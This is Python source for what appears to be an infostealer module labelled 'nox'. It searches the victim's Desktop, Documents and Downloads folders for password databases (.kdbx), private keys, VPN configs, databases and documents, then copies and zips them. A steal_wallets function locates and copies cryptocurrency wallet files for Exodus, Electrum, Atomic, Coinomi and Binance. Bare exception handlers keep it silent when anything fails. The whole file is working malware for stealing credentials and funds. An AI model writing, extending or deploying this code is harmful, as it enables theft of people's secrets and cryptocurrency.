import os
import shutil
import tempfile
import zipfile

INTERESTING_EXTS = {'.txt','.log','.csv','.json','.db','.sqlite','.docx','.pdf','.kdbx','.key','.pem','.ovpn'}
EXCLUDE_DIRS = {'node_modules','__pycache__','.git','Windows','Program Files','Program Files (x86)'}

def collect_interesting_files(output_dir=None, max_total_size_mb=5, max_files=30):
    if output_dir is None:
        output_dir = os.path.join(tempfile.gettempdir(), "nox_files")
    try:
        os.makedirs(output_dir, exist_ok=True)
    except:
        return None

    roots = [
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
    ]
    collected = []
    total_size = 0
    max_bytes = max_total_size_mb * 1024 * 1024

    for root in roots:
        if not os.path.exists(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in EXCLUDE_DIRS and not d.startswith('.')]
            if dirpath.count(os.sep) - root.count(os.sep) > 4:
                dirnames[:] = []
                continue
            for fname in filenames:
                if len(collected) >= max_files:
                    break
                ext = os.path.splitext(fname)[1].lower()
                if ext not in INTERESTING_EXTS:
                    continue
                fpath = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(fpath)
                    if size == 0 or size > 2*1024*1024:
                        continue
                    if total_size + size > max_bytes:
                        continue
                    if "NOXIOUS" in fpath:
                        continue
                    dest = os.path.join(output_dir, f"{os.path.basename(root)}_{fname}")
                    counter = 1
                    base_dest = dest
                    while os.path.exists(dest):
                        name, ext2 = os.path.splitext(base_dest)
                        dest = f"{name}_{counter}{ext2}"
                        counter += 1
                    shutil.copy2(fpath, dest)
                    collected.append(dest)
                    total_size += size
                except:
                    continue
            if len(collected) >= max_files:
                break
        if len(collected) >= max_files:
            break

    if not collected:
        try:
            os.rmdir(output_dir)
        except:
            pass
        return None
    return collected

def zip_collected_files(file_list, zip_path=None):
    if not file_list:
        return None
    if zip_path is None:
        zip_path = os.path.join(tempfile.gettempdir(), "collected_files.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
            for f in file_list:
                if os.path.exists(f):
                    z.write(f, arcname=os.path.basename(f))
        return zip_path
    except:
        return None

def steal_wallets():
    wallets = []
    candidates = {
        'Exodus': os.path.join(os.getenv('APPDATA') or '', 'Exodus', 'exodus.wallet'),
        'Electrum': os.path.join(os.getenv('APPDATA') or '', 'Electrum', 'wallets'),
        'Atomic': os.path.join(os.getenv('APPDATA') or '', 'atomic', 'Local Storage'),
        'Coinomi': os.path.join(os.getenv('LOCALAPPDATA') or '', 'Coinomi', 'Coinomi', 'wallets'),
        'Metamask': None,
        'Binance': os.path.join(os.getenv('APPDATA') or '', 'Binance'),
    }
    for name, path in candidates.items():
        if path and os.path.exists(path):
            wallets.append(f"{name}: {path}")
            try:
                if os.path.isfile(path) and os.path.getsize(path) < 5*1024*1024:
                    dest_dir = os.path.join(tempfile.gettempdir(), "nox_wallets")
                    os.makedirs(dest_dir, exist_ok=True)
                    shutil.copy2(path, os.path.join(dest_dir, f"{name}_{os.path.basename(path)}"))
                elif os.path.isdir(path):
                    try:
                        for item in os.listdir(path)[:5]:
                            wallets.append(f"  - {item}")
                    except:
                        pass
            except:
                pass
    return wallets
